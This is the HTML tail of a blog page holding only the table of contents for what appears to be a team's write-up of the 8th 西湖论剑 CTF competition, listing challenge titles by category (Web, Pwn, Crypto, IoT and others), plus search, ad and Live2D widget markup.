                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%91%E7%9F%B3%E6%BB%A9%E5%B0%8F%E9%B2%A8%E9%B1%BC-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">金石滩小鲨鱼-解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9B%A2%E9%98%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">1.团队信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="toc-number">1.2.</span> <span class="toc-text">2.解题情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B7%E4%BD%93WP"><span class="toc-number">1.3.</span> <span class="toc-text">3.具体WP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">签到</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%A4%A7%E8%B5%9B"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">欢迎来到第八届西湖论剑大赛</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.3.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Rank-l"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">Rank-l</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqli-or-not"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">sqli or not</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rank-U"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">Rank-U</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse"><span class="toc-number">1.3.3.</span> <span class="toc-text">Reverse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn"><span class="toc-number">1.3.4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Vpwn"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">Vpwn</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Heaven%E2%80%99s-door"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">Heaven’s door</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">1.3.5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#matrixRSA"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">matrixRSA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">1.3.6.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%9F%E7%B3%95%E7%9A%84%E7%A3%81%E7%9B%98"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">糟糕的磁盘</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IoT"><span class="toc-number">1.3.7.</span> <span class="toc-text">IoT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#blink"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">blink</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sharkp"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">sharkp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DS"><span class="toc-number">1.3.8.</span> <span class="toc-text">DS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#easydatalog"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">easydatalog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DSASignatureData"><span class="toc-number">1.3.8.2.</span> <span class="toc-text">DSASignatureData</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#easyrawencode"><span class="toc-number">1.3.8.3.</span> <span class="toc-text">easyrawencode</span></a></li></ol></li></ol></li></ol></li></ol>
                </div>
            </button>
            

            

            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
        </div>
    </div>
</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
</div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"left","width":350,"height":750},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>